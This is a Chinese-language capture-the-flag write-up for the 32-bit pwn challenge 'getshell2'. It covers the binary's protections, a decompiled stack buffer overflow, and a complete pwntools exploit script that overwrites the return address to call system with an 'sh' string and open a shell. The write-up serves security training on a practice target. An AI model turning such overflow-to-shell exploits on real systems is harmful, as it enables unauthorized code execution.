# nssctf [WUSTCTF 2020]getshell2 wp

## 题面
Ubuntu 16.04.  

## 分析
查看保护:
``` bash
❯ pwn checksec --file=service
[*] '/data/project/ctf-repo/pwn/nssctf/getshell2/service'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

反编译：  
非常简单的程序：
main() -> vulnerable():  
``` c
ssize_t vulnerable()
{
  _BYTE buf[24]; // [esp+0h] [ebp-18h] BYREF

  return read(0, buf, 0x24u);
}
```

同时给了如下函数：
``` c
int shell()
{
  return system("/bbbbbbbbin_what_the_f?ck__--??/sh");
}
```
这个函数不仅仅是给了 system 函数可以利用，同时还给了 `sh\x00` 片段。  

## 利用
主要是直接写 payload:  
填充-> system addr -> sh\x00 addr

注意！！！不能直接往栈上的 buf 写 /bin/sh 不然后面 ret 的时候栈回收根本找不到地址。  

## exp
``` python
from pwn import *

context.gdb_binary = "/bin/pwndbg"
system_addr = 0x8048529
io = process("./service")
#io = remote("node5.anna.nssctf.cn", 22083)
elf = ELF("./service")
sh_addr = next(elf.search(b'sh\x00'))

payload = b"a" * (0x18+4) + p32(system_addr) + p32(sh_addr)
#gdb.attach(io)
io.send(payload)
io.interactive()
```
